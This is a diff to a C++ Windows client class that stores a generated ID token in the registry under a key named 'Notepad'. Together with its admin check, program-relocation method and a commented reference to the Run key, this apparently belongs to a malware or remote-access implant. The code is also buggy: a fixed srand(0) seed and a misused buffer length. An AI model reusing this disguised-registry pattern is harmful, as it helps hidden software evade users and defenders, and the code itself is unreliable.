@@ -20,8 +20,10 @@ HandShake::HandShake()
     a_is_admin = setIsAdmin();
     a_current_directory = setCurrentDirectory();
     a_name_prog = NAME_PROG;
-    a_token = TOKEN;
-    cout << "TOKEN: " << a_token << endl;
+    cout << "----------------------------------------------\n\n" << endl;    
+    a_token = getTokenOrSetTokenInRegistry();
+
+    cout << "TOKEN: " << a_token << "<------" << endl;
     a_location_prog = setLocationProg();
     cout << "LOCATION PROG: "<<a_location_prog << endl;
 
@@ -167,31 +169,132 @@ string HandShake::setLocationProg()
         return (string) buffer;        
     }
 }
-string HandShake::setToken(const int token_size)//https://www.codespeedy.com/generate-random-hexadecimal-strings-in-cpp/
-{
-    string token;
-    DWORD status_open_key;
-    if(a_is_admin)
-    {
-        status_open_key = 
-    }
-    else
-    {
-        
-    }
-    
-    char hex_characters[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
-    int i;
-    for(i=0;i< token_size;i++)
-    {token += hex_characters[rand() % 16];}
 
+wstring HandShake::generateToken(const int token_size)//https://www.codespeedy.com/generate-random-hexadecimal-strings-in-cpp/
+{
+    wstring token;
+
+    WCHAR hex_characters[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
+    int i;
+
+
+    srand(0); //https://stackoverflow.com/questions/1190689/problem-with-rand-in-c
+
+    for(i=0;i< token_size;i++){token += hex_characters[rand()%16];}
 
     return token;
 }
+
+string HandShake::getTokenOrSetTokenInRegistry()
+{
+   // wstring token_tmp2(token_tmp.begin(), token_tmp.end());
+
+    //const WCHAR *token = wstring(token_tmp.begin(), token_tmp.end()).c_str(); //(data)
+    wstring tmp_return;
+
+    WCHAR name[] = L"config"; //name of string key.
+    WCHAR token[128];
+
+    LONG status; //allows to check the situation of the functions 
+    HKEY hKey;
+
+    DWORD lpType; //RegQueryValueExW
+    WCHAR buffer[128]; //RegQueryValueExW lpData (token)
+    DWORD lpcbData = sizeof(buffer); 
+
+    //--------------------------------------------------------------------------------
+
+    HKEY HKEY_admin_or_not = NULL;
+    WCHAR path_of_key[64];
+
+    //--------------------------------------------------------------------------------
+
+    //Initialization of variables according to privileges. 
+    if(a_is_admin) //test if admin | if admin set  HKEY_LOCAL_MACHINE else set HKCU
+    {
+        //if user is admin
+        HKEY_admin_or_not = HKEY_LOCAL_MACHINE;
+        wcscpy(path_of_key, L"SOFTWARE\\WOW6432Node\\Notepad");
+    }
+    else
+    {
+        //if user not admin
+        HKEY_admin_or_not = HKEY_CURRENT_USER;
+        wcscpy(path_of_key, L"Software\\WoW6432Node\\Notepad");
+    }
+    //--------------------------------------------------------------------------------
+
+    //test if key exist (key = Notepad)
+    status = RegOpenKeyExW(HKEY_admin_or_not, path_of_key, 0, KEY_ALL_ACCESS, &hKey); // RegOpenKeyEx(HKEY_LOCAL_MACHINE,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,KEY_ALL_ACCESS,
+    if(status != ERROR_SUCCESS)
+    {
+        //KEY Notepad no exist  | create key and set token.
+        cout << "[-] Key  'Notepad' not exist..." << endl;
+        //HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Notepad", 0, NULL,  REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey,&lpdwDisposition
+        status = RegCreateKeyExW(HKEY_admin_or_not, path_of_key, 0, NULL,  REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey,NULL);
+        if(status != ERROR_SUCCESS)
+        {
+            //if If the notepad key has not been created.  
+            cout << "[-] Key not create..." << endl;
+        }
+        else
+        {
+            cout << "[+] Key is create...." << endl;
+        }
+    }
+    cout << "[+] Key is open. " << endl;
+
+    //get value (string)
+    status = RegQueryValueExW(hKey, name ,NULL , &lpType, (LPBYTE) buffer , &lpcbData); 
+    if(status != ERROR_SUCCESS)
+    {
+        //string of key not found or token is not defined.
+        cout << "[-] Value not found." << endl;
+
+        cout << "hello: " << wcslen(buffer) << endl;
+        ZeroMemory(&buffer, wcslen(buffer));
+        cout << wcslen(buffer) << endl;
+
+        wcscpy(token, generateToken(24).c_str()); //(data)
+        
+        
+        //set key:
+        status =  RegSetValueExW(hKey, name ,0, REG_SZ, (LPBYTE) token, lpcbData);
+        if(status != ERROR_SUCCESS)
+        {
+            //If an error lores the attribution of the token. (fuck windows)
+            cout << "FATAL ERROR" << endl;
+        }
+        else
+        {
+            //the token was well initialized.
+            cout << "[+] the token was well initialized. " << endl;
+            wcout << "token: " << token << endl;
+        }
+        cout<< " LAST ERROR: " << GetLastError() << endl;
+    }
+
+    else
+    {
+        wcout << "TOKEN: " << buffer  << "<-0101010" << endl;
+        
+        tmp_return = buffer;
+        return string(tmp_return.begin(), tmp_return.end());
+    }
+
+    RegCloseKey(hKey);
+
+    tmp_return = token;
+    string result(tmp_return.begin(), tmp_return.end());
+    return result;
+}
+
+
 bool HandShake::getIsAdmin()
 {
     return a_is_admin; //ghetter
 }
+
 
 string HandShake::getPathProg()
 {
@@ -199,10 +302,17 @@ string HandShake::getPathProg()
     return a_location_prog;
 }
 
+
 string HandShake::getNameUser()
 {
     return a_name_user;
 }
+
+string HandShake::getToken()
+{
+    return a_token; 
+}
+
 
 void HandShake::moveProg()
 {
